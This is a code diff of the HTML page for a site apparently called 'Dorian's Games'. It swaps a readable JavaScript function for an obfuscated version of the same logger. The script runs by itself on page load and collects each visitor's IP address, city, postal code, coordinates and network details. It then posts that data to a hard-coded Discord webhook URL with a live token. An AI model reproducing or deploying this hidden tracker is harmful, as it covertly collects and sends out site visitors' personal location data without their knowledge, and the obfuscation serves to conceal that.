@@ -1,57 +1,7 @@
 <!DOCTYPE html>
 <html>
 <script>
-function monke() {
-    var request = new XMLHttpRequest();
-    var ipapiUrl = "https://ipapi.co/json/";
-
-    request.open("GET", ipapiUrl, true);
-    request.onreadystatechange = function () {
-        if (request.readyState === 4 && request.status === 200) {
-            var json = JSON.parse(request.responseText);
-            
-            var discordRequest = new XMLHttpRequest();
-            discordRequest.open("POST", "https://discord.com/api/webhooks/1286488206644219964/XykS1fkcWeALeFMO3GRvHpwe3hQKBoJ4bw2XgBtzYtveSLLSmnqJegtvJBCA4ctcnpkw", true);
-            discordRequest.setRequestHeader('Content-type', 'application/json');
-
-            var params = {
-                username: "Gamebot",
-                avatar_url: "",
-                content: "New Visitor!",
-                embeds: [
-                    {
-                        title: "Someone visited Dorian's Games!",
-                        color: 1752220,
-                        description: 
-                            "**IP:** `" + json.ip + "`\n" +
-                            "**Network:** `" + json.network + "`\n" +
-                            "**Version:** `" + json.version + "`\n" +
-                            "**City:** `" + json.city + "`\n" +
-                            "**Region:** `" + json.region + "`\n" +
-                            "**Region Code:** `" + json.region_code + "`\n" +
-                            "**Country:** `" + json.country_name + "`\n" +
-                            "**Country Code:** `" + json.country + "`\n" +
-                            "**Country Capital:** `" + json.country_capital + "`\n" +
-                            "**Postal Code:** `" + json.postal + "`\n" +
-                            "**Latitude:** `" + json.latitude + "`\n" +
-                            "**Longitude:** `" + json.longitude + "`\n" +
-                            "**Timezone:** `" + json.timezone + "`\n" +
-                            "**UTC Offset:** `" + json.utc_offset + "`\n" +
-                            "**Country Calling Code:** `" + json.country_calling_code + "`\n" +
-                            "**Currency:** `" + json.currency + "`\n" +
-                            "**Currency Name:** `" + json.currency_name + "`\n" +
-                            "**Languages:** `" + json.languages + "`\n" +
-                            "**ASN:** `" + json.asn + "`\n" +
-                            "**Org:** `" + json.org + "`"
-                    }
-                ]
-            };
-
-            discordRequest.send(JSON.stringify(params));
-        }
-    };
-    request.send();
-}
+function _0x1582(_0x3ee13b,_0x37171b){var _0x4ad922=_0x4ad9();return _0x1582=function(_0x158289,_0x48fb0c){_0x158289=_0x158289-0x6c;var _0x4f84b2=_0x4ad922[_0x158289];return _0x4f84b2;},_0x1582(_0x3ee13b,_0x37171b);}(function(_0x92f9f7,_0x25104a){var _0x1265d8=_0x1582,_0x44404a=_0x92f9f7();while(!![]){try{var _0x45299b=parseInt(_0x1265d8(0x84))/0x1+-parseInt(_0x1265d8(0x7d))/0x2+-parseInt(_0x1265d8(0x9b))/0x3*(parseInt(_0x1265d8(0x74))/0x4)+parseInt(_0x1265d8(0xa4))/0x5+parseInt(_0x1265d8(0x6c))/0x6*(-parseInt(_0x1265d8(0xa1))/0x7)+-parseInt(_0x1265d8(0x7a))/0x8*(-parseInt(_0x1265d8(0x99))/0x9)+parseInt(_0x1265d8(0x76))/0xa*(-parseInt(_0x1265d8(0x81))/0xb);if(_0x45299b===_0x25104a)break;else _0x44404a['push'](_0x44404a['shift']());}catch(_0x3f2782){_0x44404a['push'](_0x44404a['shift']());}}}(_0x4ad9,0xbd17a));function monke(){var _0x2c0d01=_0x1582,_0x5e8040=new XMLHttpRequest(),_0x520e99=_0x2c0d01(0x90);_0x5e8040[_0x2c0d01(0x8e)]('GET',_0x520e99,!![]),_0x5e8040[_0x2c0d01(0x6f)]=function(){var _0x1f07da=_0x2c0d01;if(_0x5e8040[_0x1f07da(0x89)]===0x4&&_0x5e8040[_0x1f07da(0x88)]===0xc8){var _0x131206=JSON[_0x1f07da(0x8f)](_0x5e8040[_0x1f07da(0x9e)]),_0x3a70e7=new XMLHttpRequest();_0x3a70e7[_0x1f07da(0x8e)](_0x1f07da(0x71),_0x1f07da(0x95),!![]),_0x3a70e7[_0x1f07da(0x91)](_0x1f07da(0x73),_0x1f07da(0x93));var _0x524f86={'username':_0x1f07da(0x92),'avatar_url':'','content':_0x1f07da(0x87),'embeds':[{'title':_0x1f07da(0x98),'color':0x1abc9c,'description':_0x1f07da(0x9d)+_0x131206['ip']+'`\x0a'+_0x1f07da(0x80)+_0x131206[_0x1f07da(0x9f)]+'`\x0a'+_0x1f07da(0x72)+_0x131206[_0x1f07da(0x82)]+'`\x0a'+'**City:**\x20`'+_0x131206[_0x1f07da(0x8c)]+'`\x0a'+'**Region:**\x20`'+_0x131206['region']+'`\x0a'+_0x1f07da(0x8b)+_0x131206[_0x1f07da(0x83)]+'`\x0a'+'**Country:**\x20`'+_0x131206['country_name']+'`\x0a'+_0x1f07da(0x9c)+_0x131206[_0x1f07da(0x7b)]+'`\x0a'+_0x1f07da(0xa2)+_0x131206[_0x1f07da(0x77)]+'`\x0a'+_0x1f07da(0x6e)+_0x131206[_0x1f07da(0x75)]+'`\x0a'+_0x1f07da(0x97)+_0x131206[_0x1f07da(0x7e)]+'`\x0a'+_0x1f07da(0x94)+_0x131206['longitude']+'`\x0a'+_0x1f07da(0x70)+_0x131206['timezone']+'`\x0a'+_0x1f07da(0x8d)+_0x131206[_0x1f07da(0x7f)]+'`\x0a'+_0x1f07da(0x86)+_0x131206[_0x1f07da(0x96)]+'`\x0a'+_0x1f07da(0xa3)+_0x131206[_0x1f07da(0x6d)]+'`\x0a'+_0x1f07da(0x9a)+_0x131206['currency_name']+'`\x0a'+'**Languages:**\x20`'+_0x131206[_0x1f07da(0xa0)]+'`\x0a'+_0x1f07da(0x7c)+_0x131206[_0x1f07da(0x85)]+'`\x0a'+_0x1f07da(0x79)+_0x131206['org']+'`'}]};_0x3a70e7[_0x1f07da(0x78)](JSON[_0x1f07da(0x8a)](_0x524f86));}},_0x5e8040[_0x2c0d01(0x78)]();}function _0x4ad9(){var _0x175e95=['send','**Org:**\x20`','3928pECKTO','country','**ASN:**\x20`','215870pNqWWu','latitude','utc_offset','**Network:**\x20`','6569618tbVCDD','version','region_code','135864QjDSTh','asn','**Country\x20Calling\x20Code:**\x20`','New\x20Visitor!','status','readyState','stringify','**Region\x20Code:**\x20`','city','**UTC\x20Offset:**\x20`','open','parse','https://ipapi.co/json/','setRequestHeader','Gamebot','application/json','**Longitude:**\x20`','https://discord.com/api/webhooks/1286488206644219964/XykS1fkcWeALeFMO3GRvHpwe3hQKBoJ4bw2XgBtzYtveSLLSmnqJegtvJBCA4ctcnpkw','country_calling_code','**Latitude:**\x20`','Someone\x20visited\x20Dorian\x27s\x20Games!','12321yaiCXH','**Currency\x20Name:**\x20`','20970mMbgkU','**Country\x20Code:**\x20`','**IP:**\x20`','responseText','network','languages','14994ZbEacn','**Country\x20Capital:**\x20`','**Currency:**\x20`','7174760DOfqgH','426okjdjW','currency','**Postal\x20Code:**\x20`','onreadystatechange','**Timezone:**\x20`','POST','**Version:**\x20`','Content-type','8wOnJSg','postal','20ICNBvx','country_capital'];_0x4ad9=function(){return _0x175e95;};return _0x4ad9();}
 </script>
 	<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
 	<head>
